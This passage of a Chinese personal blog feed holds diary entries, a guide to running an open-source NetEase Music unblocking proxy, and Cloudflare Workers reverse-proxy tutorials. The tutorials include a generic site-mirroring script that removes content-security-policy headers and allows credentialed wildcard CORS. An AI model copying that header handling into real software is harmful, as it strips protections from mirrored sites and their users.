机动右侧鼓掌</p><p>13、KIKI跳</p><p>14、全队跳</p><p>—END—</p><p>制作者名单</p><hr><p>对比起视频，讲真，有些镜头我们并没有拍。但是拍摄过程中，同一素材我们拍摄了多次，而且也在刷突击的时候顺带拍摄了某些素材，拍摄时长算下来一个小时多一点，效率还是挺高的。</p><p>然后就到了最难的时候了——传素材。我们是四个人分别录制了素材，土豆（这里指<a href="https://space.bilibili.com/22267745/">@MI-rice-json</a>，因为WARFRAME的ID叫做UBI.the.potato故称作土豆）的电脑比较渣，录了一小段，总共1.46GB，直接使用奶牛快传传给了我；笨猫（此处指<a href="https://space.bilibili.com/49835313/">@ThisNEKKO_xd</a>）录了总共2.54GB素材，因为人就在我旁边，所以直接用我的SSD拷贝过来；最难的是<a href="https://space.bilibili.com/49914186/">@GEnX</a>的素材，他的电脑被我们称为“全队最好的电脑”，大部分素材都是他那里录制出来的，总共有29个G，这可难了，QQ最大传输文件和奶牛快传最大传输大小都为4个G，我就想到用压缩的方式，把文件分成N个4095MB（4GB&#x3D;4096MB）的压缩包分段，然后一个一个传。<a href="https://space.bilibili.com/49914186/">@GEnX</a>的龟速上行网络最高只有2.5MB&#x2F;s的传输速度，所以无论我的下载速度多快也突破不了这2.5MB&#x2F;s的上限，没办法，只能慢慢传了。8个文件，5个用QQ传输，3个用奶牛快传，总计传输了5个多小时。。。</p><p>终于传完素材了！可以开始剪辑啦！我满心欢喜地打开了我的PR，问题又来了！我的PR，它，它，它居然——闪退！！！因为我安装的是Adobe Premiere Pro 2020，上网查了以后发现，没有CC（Adobe Creative Cloud）是运行不了的，我就只能被迫下了一个CC（太难了），开始了剪辑</p><p>剪辑花费时长大概两个小时，因为素材拖进PR里面以后，PR会自动开始生成视频的峰值文件，这就吃了我很大一部分的CPU，只能顶着100%的CPU剪辑，剪辑了两个半小时（期间包括我上大字幕和<a href="https://space.bilibili.com/49835313/">@ThisNEKKO_xd</a>上下面的字幕），终于完成了~</p><p>然后我就开始上传，编辑稿件，选择投稿日期-&gt;2020.1.22 09:00（因为这天刚好是我农历生日，我家生日算农历），然后提交了稿件，关上了电脑。</p><p>出场的仓鼠们如下（以下为WARFRAME ID）：<br>音乐甲 &amp; NOVA PRIME <code>@Gamer.bili</code><br>瓦喵 PRIME &amp; 电男 PRIME <code>@NotFound404.</code><br>黑咖喱 &amp; ASH PRIME &amp; 指挥官 <code>@UBI.the.potato</code><br>女枪PRIME &amp; （潜行）指挥官 <code>@GODGEnX</code><br>制作者名单：<br>导演 <code>@Gamer.bili</code><br>剧本 <code>@Gamer.bili @NotFound404.</code><br>拍摄 <code>@GODGEnX @NotFound404. @Gamer.bili</code><br>剪辑 <code>@Gamer.bili @NotFound404.</code><br>字幕 <code>@NotFound404.</code></p><p>现在我写这一篇文章，应该是算作留个纪念吧，毕竟，这个视频做起来也不容易。。。</p><p>喜欢我的视频，请长按点赞键支持我哦~虽然我只是一只比白咕咕还要会咕咕咕的鸽子~</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Diary/Gugugu.jpg" alt="白咕咕"></p><p>2020.1.22</p><p>GamerNoTitle</p>]]></content>
      
      
      <categories>
          
          <category> diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> diary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网易云音乐去除版权限制（Nodejs）</title>
      <link href="/posts/Unblock163Music/"/>
      <url>/posts/Unblock163Music/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><div class="note info flat"><h3 id="2020-3-23重制"><a href="#2020-3-23重制" class="headerlink" title="2020.3.23重制"></a>2020.3.23重制</h3></div><p><strong>今天拿网易云开刀~</strong></p><p>网易云音乐一直是我们使用得比较频繁的音乐平台，可是他的版权问题实在是令人发寒，每次搜索音乐就看着灰色的歌名失望。。。而隔壁的扣扣音乐就什么都有<br><img src="https://f002.backblazeb2.com/file/GamerNoTitle-img/home/UnblockNeteaseMusic/CloudMusic-Gray.png" alt="灰色的网易云音乐"></p><p>这种情况真的很烦，点开一首歌直接告诉你因版权无法播放，这时候我们就需要脚本登场了<br>脚本由@nondanee编写，原理是将其他音乐网站的链接替换到网易云，所以并不存在破解网易云音乐的软件，与法律并不矛盾。<br>源代码可以点<a href="https://github.com/nondanee/UnblockNeteaseMusic">@nondanee&#x2F;UnblockNeteaseMusic</a>，在使用之前，需要安装nodejs环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/nondanee/UnblockNeteaseMusic.git</span><br></pre></td></tr></table></figure><p>克隆代码后，在文件夹里启动命令窗口，输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npx @nondanee/unblockneteasemusic</span><br></pre></td></tr></table></figure><p>就可以打开程序了，如果提示npx未找到，请先使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install npx -g</span><br></pre></td></tr></table></figure><p>来安装npx哦~</p><p>启动了以后，在你的网易云音乐里面修改代理，按照你的配置填写即可！</p><p><img src="https://f002.backblazeb2.com/file/GamerNoTitle-img/home/UnblockNeteaseMusic/Proxy.png" alt="代理修改"></p><hr><p>题外话：</p><p>最近Github的地址raw.githubusercontent.com好像被墙了？不能直接在Github网站中下载RAW文件，很烦</p><p>CloudFlare的Workers最近也是BUG一大堆，总是给我抛出1101错误，先不搭建新的反代了……</p><p>本网站的邮件提醒已经搭建好了，以后留言就有邮件了~</p>]]></content>
      
      
      <categories>
          
          <category> Software </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Software </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cloudflare Workers反代实战（下）</title>
      <link href="/posts/Cloudflare-Workers-Section2/"/>
      <url>/posts/Cloudflare-Workers-Section2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><a href="/2019/10/25/CloudFlare-Workers-Section1/">上篇</a>说道：<br>我们已经成功搭建了Workers的反代服务，但是有的时候我们需要绑定自己的域名来访问该网页，那么本篇我们将来讲一讲怎么绑定自己的域名来访问workers<br>我们先来到我们的域名管理界面，点开自己的任意一个域名，然后点击上面的workers<br><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Cloudflare-Workers/workers-in-domain.png" alt="workers-in-domain"><br>在本界面中，上面的两个按钮点击Add Route<br><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Cloudflare-Workers/Workers-Panel.png" alt="Workers-Panel"><br>然后在上面填写你想要的域名（当然得是你的域名），格式如<code>&lt;SubDoamin&gt;.&lt;Domain&gt;/*</code>，下面选择你创建好的Workers配置，例如我在上面填写<code>g.bili33.top/*</code>，然后下面选择我的名字叫做”g”的Workers配置文件（用于反代Google)，然后点击保存，这样就成功添加了route，当然这个时候并不是直接访问就可以访问被反代的网站，而是要进行进一步配置~</p><p>回到我们的域名DNS解析界面，添加一个CNAME记录，指向我们的Workers，在这之中，Proxy Status一定要设定为Proxied！下面照样给个例子</p><table><thead><tr><th>Type</th><th>Name</th><th>Target</th><th>TTL</th><th>Proxy</th></tr></thead><tbody><tr><td>CNAME</td><td>g</td><td>g.bili33.workers.dev</td><td>Auto</td><td><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDQgMzkuNSI+PGRlZnM+PHN0eWxlPi5jbHMtMXtmaWxsOiM5OTk7fS5jbHMtMntmaWxsOiNmNjhhMWQ7fS5jbHMtM3tmaWxsOiNmZmY7fTwvc3R5bGU+PC9kZWZzPjx0aXRsZT5Bc3NldCAxPC90aXRsZT48ZyBpZD0iTGF5ZXJfMiIgZGF0YS1uYW1lPSJMYXllciAyIj48ZyBpZD0iTGF5ZXJfMS0yIiBkYXRhLW5hbWU9IkxheWVyIDEiPjxwb2x5Z29uIGNsYXNzPSJjbHMtMSIgcG9pbnRzPSIxMDQgMjAuMTIgOTQgMTAuNjIgOTQgMTYuMTIgMCAxNi4xMiAwIDI0LjEyIDk0IDI0LjEyIDk0IDI5LjYyIDEwNCAyMC4xMiIvPjxwYXRoIGNsYXNzPSJjbHMtMiIgZD0iTTc0LjUsMzljLTIuMDgsMC0xNS40My0uMTMtMjguMzQtLjI1LTEyLjYyLS4xMi0yNS42OC0uMjUtMjcuNjYtLjI1YTgsOCwwLDAsMS0xLTE1LjkzYzAtLjE5LDAtLjM4LDAtLjU3YTkuNDksOS40OSwwLDAsMSwxNC45LTcuODEsMTkuNDgsMTkuNDgsMCwwLDEsMzguMDUsNC42M0ExMC41LDEwLjUsMCwxLDEsNzQuNSwzOVoiLz48cGF0aCBjbGFzcz0iY2xzLTMiIGQ9Ik01MSwxQTE5LDE5LDAsMCwxLDcwLDE5LjU5LDEwLDEwLDAsMSwxLDc0LjUsMzguNWMtNC4xMSwwLTUyLS41LTU2LS41YTcuNSw3LjUsMCwwLDEtLjQ0LTE1QTguNDcsOC40NywwLDAsMSwxOCwyMmE5LDksMCwwLDEsMTQuNjgtN0ExOSwxOSwwLDAsMSw1MSwxbTAtMUEyMCwyMCwwLDAsMCwzMi4xMywxMy40MiwxMCwxMCwwLDAsMCwxNywyMnYuMTRBOC41LDguNSwwLDAsMCwxOC41LDM5YzIsMCwxNSwuMTMsMjcuNjYuMjUsMTIuOTEuMTIsMjYuMjYuMjUsMjguMzQuMjVhMTEsMTEsMCwxLDAtMy42MS0yMS4zOUEyMC4xLDIwLjEsMCwwLDAsNTEsMFoiLz48L2c+PC9nPjwvc3ZnPg=="></td></tr></tbody></table><p>然后添加进入DNS解析，这时候我们再访问自己的域名（在这里是<a href="http://g.bili33.top/">g.bili33.top</a>），然后就发现我们进入了自己反代的网站</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Cloudflare-Workers/Result.png"></p><p>当然这也有一定的缺点：</p><p>1、因为Redirect URL与api不一致，所以反代出来的网站一般无法登陆</p><p>2、使用了Google Recaptcha之类的验证码用于网站保护的网站可能会因为Redirect URL不一致而导致无法访问（如Google自带的Recaptcha保护机制将导致无法进行搜索，这种情况下更换被反代的Google地区即可）</p><hr><div class="note primary flat"><h4 id="2020-3-14-更新"><a href="#2020-3-14-更新" class="headerlink" title="2020.3.14 更新"></a>2020.3.14 更新</h4><p>今天给我的博客上SSL，然后临时把CloudFlare自带的SSL关掉了，代理Google旗下网站出现了重定向次数过多的问题，把SSL调回Flexible就可以了，目前只发现Google旗下产品会出现此问题，其他暂未发现</p></div><hr><p>题外话：</p><p>网站终于又开始更新啦！小高考考得个人感觉还不错，二月份出成绩*V*，六月份还有物理和政治的……</p><p><a href="https://github.com/TheBaiRuo">@TheBaiRuo</a>的公网IP被墙了，需要备案，所以他的网站进不去，确实是有点惨吼，Github Pages它不香吗？</p><p>另外，在Cloudflare的workers调试界面有可能会出现500的错误码，忽略就好，实际上部署后是可以访问的（除非cloudflare分配给你的服务器炸了）</p>]]></content>
      
      
      <categories>
          
          <category> Software </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Software </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日常吐槽02</title>
      <link href="/posts/diary2/"/>
      <url>/posts/diary2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>今天是周日，还要考试，哭了。。。</p><p>本周二是学校的研学活动，但是说不给带手机给带相机，对我倒是没什么所谓啦（原因在下面），但是学校有没有考虑过有些人家里莫得相机啊？</p><p>周三晚上校运会开幕式，有我们至今为止最庞大的直播阵容：</p><p>直播及录像机：我的Lenovo不知道是什么鬼型号，反正i7 7700k够用了，加个16G运存，用NDI采集导播机的画面<br>导播机：梅导的新电脑，用的9900k还有32G运存，我觉得用vmix莫得问题，用NDI传输画面给我的电脑中的OBS<br>（PS：我们是vMix导播切镜头，我的OBS来直播+录像）<br>字幕机：梅导以前的电脑，用的6700k<br>采集机（4台）：采集四个相机&#x2F;无人机的实时画面，利用NDI传输到导播机<br>相信这一次我们能够避免上次的马赛克<br>由于导播，所以我们一定要使用手机，所以上面才说没什么所谓~</p><p>准备退休啦~</p>]]></content>
      
      
      <categories>
          
          <category> diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> diary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日常吐槽01</title>
      <link href="/posts/diary1/"/>
      <url>/posts/diary1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>想开一个日常吐槽分区，除了技术（汗？）文还可以发一发平常的感受~</p><p>期中考考完啦！！！开心~</p><p>但是数学考得不很好，反正就是不很好（自闭中）</p><p>本周遇到了<a href="https://wordpress.org/">wordpress</a>会出现429错误的问题，貌似被墙了，果断搭建一个<a href="http://wordpress.bili33.workers.dev/">代理站</a>，但是wordpress的链接不是相对链接，是绝对链接，所以要下载wordpress要手动把原来的域名改成我的域名</p><p><a href="http://wordpress.bili33.workers.dev/latest-zh_CN.zip">点我下载wordpress最新版~(zip)</a></p><p><a href="http://wordpress.bili33.workers.dev/latest-zh_CN.tar.gz">点我下载wordpress最新版~(tar.gz)</a></p>]]></content>
      
      
      <categories>
          
          <category> diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> diary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cloudflare Workers反代实战（上）</title>
      <link href="/posts/CloudFlare-Workers-Section1/"/>
      <url>/posts/CloudFlare-Workers-Section1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>CloudFlare一直以其域名托管服务和CDN服务闻名于各位网站管理员，当然我的域名也是托管在这个上面的，后来，有一位被我介绍入CF的同志告诉我CF有种功能。。。（<a href="https://bairuo.top/">@TheBaiRuo</a>）</p><p>就是CF的Workers服务，这是一种能够访问网页时运行特定的JS脚本的服务，所以我们就可以利用它进行 <del>JSPROXY</del> Workers-Proxy（感谢@Anonymous的提醒）的搭建（某反向代理）</p><h4 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h4><p>1、一个CloudFlare账号</p><p>2、一个域名（可以到Freenom注册一个）</p><h4 id="搭建反向代理"><a href="#搭建反向代理" class="headerlink" title="搭建反向代理"></a>搭建反向代理</h4><p>在这之前，你需要把你的域名托管到CF上！！！</p><p>然后进入CF的workers界面，看下图</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Cloudflare-Workers/into-workers.png" alt="Workers"></p><p>进入到Workers后，点击Create a Worker来创建你的第一个JS</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Cloudflare-Workers/Workers-Interface.png" alt="Create a Worker"></p><p>然后在workers界面的左边，填入你的JS代码，这时候就需要万能反代代码QAQ</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Cloudflare-Workers/Workers-Edit.png" alt="Worker Editor"></p><p>解释一下这个界面：</p><p>①项目名称：表现为**[Project].[subdomain].workers.dev**，其中subdomain是你注册workers是输入的名字，project就是项目名称</p><p>②编辑区：就是你放下代码的地方</p><p>③效果预览区：当你按下运行按钮的时候展现出来的效果</p><p>④运行：顾名思义，运行嘛，然后在右边看得到</p><p>⑤保存并部署：部署该项目</p><p>将下面的代码放到你的编辑区中：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 替换成你想镜像的站点</span></span><br><span class="line"><span class="keyword">const</span> upstream = <span class="string">&#x27;example.com&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// 如果那个站点有专门的移动适配站点，否则保持和上面一致</span></span><br><span class="line"><span class="keyword">const</span> upstream_mobile = <span class="string">&#x27;example.com&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// 你希望禁止哪些国家访问</span></span><br><span class="line"><span class="keyword">const</span> blocked_region = [<span class="string">&#x27;KP&#x27;</span>]</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 禁止自访问</span></span><br><span class="line"><span class="keyword">const</span> blocked_ip_address = [<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="string">&#x27;127.0.0.1&#x27;</span>]</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 替换成你想镜像的站点</span></span><br><span class="line"><span class="keyword">const</span> replace_dict = &#123;</span><br><span class="line">    <span class="string">&#x27;$upstream&#x27;</span>: <span class="string">&#x27;$custom_domain&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;//google.com&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//以下内容都不用动</span></span><br><span class="line"><span class="title function_">addEventListener</span>(<span class="string">&#x27;fetch&#x27;</span>, <span class="function"><span class="params">event</span> =&gt;</span> &#123;</span><br><span class="line">    event.<span class="title function_">respondWith</span>(<span class="title function_">fetchAndApply</span>(event.<span class="property">request</span>));</span><br><span class="line">&#125;)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">fetchAndApply</span>(<span class="params">request</span>) &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">const</span> region = request.<span class="property">headers</span>.<span class="title function_">get</span>(<span class="string">&#x27;cf-ipcountry&#x27;</span>).<span class="title function_">toUpperCase</span>();</span><br><span class="line">    <span class="keyword">const</span> ip_address = request.<span class="property">headers</span>.<span class="title function_">get</span>(<span class="string">&#x27;cf-connecting-ip&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> user_agent = request.<span class="property">headers</span>.<span class="title function_">get</span>(<span class="string">&#x27;user-agent&#x27;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">let</span> response = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">let</span> url = <span class="keyword">new</span> <span class="title function_">URL</span>(request.<span class="property">url</span>);</span><br><span class="line">    <span class="keyword">let</span> url_host = url.<span class="property">host</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (url.<span class="property">protocol</span> == <span class="string">&#x27;http:&#x27;</span>) &#123;</span><br><span class="line">        url.<span class="property">protocol</span> = <span class="string">&#x27;https:&#x27;</span></span><br><span class="line">        response = <span class="title class_">Response</span>.<span class="title function_">redirect</span>(url.<span class="property">href</span>);</span><br><span class="line">        <span class="keyword">return</span> response;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">await</span> <span class="title function_">device_status</span>(user_agent)) &#123;</span><br><span class="line">        upstream_domain = upstream</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        upstream_domain = upstream_mobile</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    url.<span class="property">host</span> = upstream_domain;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (blocked_region.<span class="title function_">includes</span>(region)) &#123;</span><br><span class="line">        response = <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="string">&#x27;Access denied: WorkersProxy is not available in your region yet.&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="number">403</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(blocked_ip_address.<span class="title function_">includes</span>(ip_address))&#123;</span><br><span class="line">        response = <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="string">&#x27;Access denied: Your IP address is blocked by WorkersProxy.&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="number">403</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> method = request.<span class="property">method</span>;</span><br><span class="line">        <span class="keyword">let</span> request_headers = request.<span class="property">headers</span>;</span><br><span class="line">        <span class="keyword">let</span> new_request_headers = <span class="keyword">new</span> <span class="title class_">Headers</span>(request_headers);</span><br><span class="line"> </span><br><span class="line">        new_request_headers.<span class="title function_">set</span>(<span class="string">&#x27;Host&#x27;</span>, upstream_domain);</span><br><span class="line">        new_request_headers.<span class="title function_">set</span>(<span class="string">&#x27;Referer&#x27;</span>, url.<span class="property">href</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">let</span> original_response = <span class="keyword">await</span> <span class="title function_">fetch</span>(url.<span class="property">href</span>, &#123;</span><br><span class="line">            <span class="attr">method</span>: method,</span><br><span class="line">            <span class="attr">headers</span>: new_request_headers</span><br><span class="line">        &#125;)</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">let</span> original_response_clone = original_response.<span class="title function_">clone</span>();</span><br><span class="line">        <span class="keyword">let</span> original_text = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">let</span> response_headers = original_response.<span class="property">headers</span>;</span><br><span class="line">        <span class="keyword">let</span> new_response_headers = <span class="keyword">new</span> <span class="title class_">Headers</span>(response_headers);</span><br><span class="line">        <span class="keyword">let</span> status = original_response.<span class="property">status</span>;</span><br><span class="line"> </span><br><span class="line">        new_response_headers.<span class="title function_">set</span>(<span class="string">&#x27;access-control-allow-origin&#x27;</span>, <span class="string">&#x27;*&#x27;</span>);</span><br><span class="line">        new_response_headers.<span class="title function_">set</span>(<span class="string">&#x27;access-control-allow-credentials&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">        new_response_headers.<span class="title function_">delete</span>(<span class="string">&#x27;content-security-policy&#x27;</span>);</span><br><span class="line">        new_response_headers.<span class="title function_">delete</span>(<span class="string">&#x27;content-security-policy-report-only&#x27;</span>);</span><br><span class="line">        new_response_headers.<span class="title function_">delete</span>(<span class="string">&#x27;clear-site-data&#x27;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">const</span> content_type = new_response_headers.<span class="title function_">get</span>(<span class="string">&#x27;content-type&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (content_type.<span class="title function_">includes</span>(<span class="string">&#x27;text/html&#x27;</span>) &amp;&amp; content_type.<span class="title function_">includes</span>(<span class="string">&#x27;UTF-8&#x27;</span>)) &#123;</span><br><span class="line">            original_text = <span class="keyword">await</span> <span class="title function_">replace_response_text</span>(original_response_clone, upstream_domain, url_host);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            original_text = original_response_clone.<span class="property">body</span></span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        response = <span class="keyword">new</span> <span class="title class_">Response</span>(original_text, &#123;</span><br><span class="line">            status,</span><br><span class="line">            <span class="attr">headers</span>: new_response_headers</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> response;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">replace_response_text</span>(<span class="params">response, upstream_domain, host_name</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> text = <span class="keyword">await</span> response.<span class="title function_">text</span>()</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">var</span> i, j;</span><br><span class="line">    <span class="keyword">for</span> (i <span class="keyword">in</span> replace_dict) &#123;</span><br><span class="line">        j = replace_dict[i]</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="string">&#x27;$upstream&#x27;</span>) &#123;</span><br><span class="line">            i = upstream_domain</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (i == <span class="string">&#x27;$custom_domain&#x27;</span>) &#123;</span><br><span class="line">            i = host_name</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (j == <span class="string">&#x27;$upstream&#x27;</span>) &#123;</span><br><span class="line">            j = upstream_domain</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (j == <span class="string">&#x27;$custom_domain&#x27;</span>) &#123;</span><br><span class="line">            j = host_name</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">let</span> re = <span class="keyword">new</span> <span class="title class_">RegExp</span>(i, <span class="string">&#x27;g&#x27;</span>)</span><br><span class="line">        text = text.<span class="title function_">replace</span>(re, j);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> text;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">device_status</span> (user_agent_info) &#123;</span><br><span class="line">    <span class="keyword">var</span> agents = [<span class="string">&quot;Android&quot;</span>, <span class="string">&quot;iPhone&quot;</span>, <span class="string">&quot;SymbianOS&quot;</span>, <span class="string">&quot;Windows Phone&quot;</span>, <span class="string">&quot;iPad&quot;</span>, <span class="string">&quot;iPod&quot;</span>];</span><br><span class="line">    <span class="keyword">var</span> flag = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> v = <span class="number">0</span>; v &lt; agents.<span class="property">length</span>; v++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (user_agent_info.<span class="title function_">indexOf</span>(agents[v]) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            flag = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后点击运行，就可以反代你需要的网站啦，但是注意，有些网站是无法进行反代的，例如twitter之类的，而且如果原来的网站具有登陆功能，那么这些<strong>登陆功能是无法使用的！！！</strong></p><div class="note primary flat"><p>加密版（来自<a href="/2019/10/25/CloudFlare-Workers/">旧版文章</a>评论区@Hostloc）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 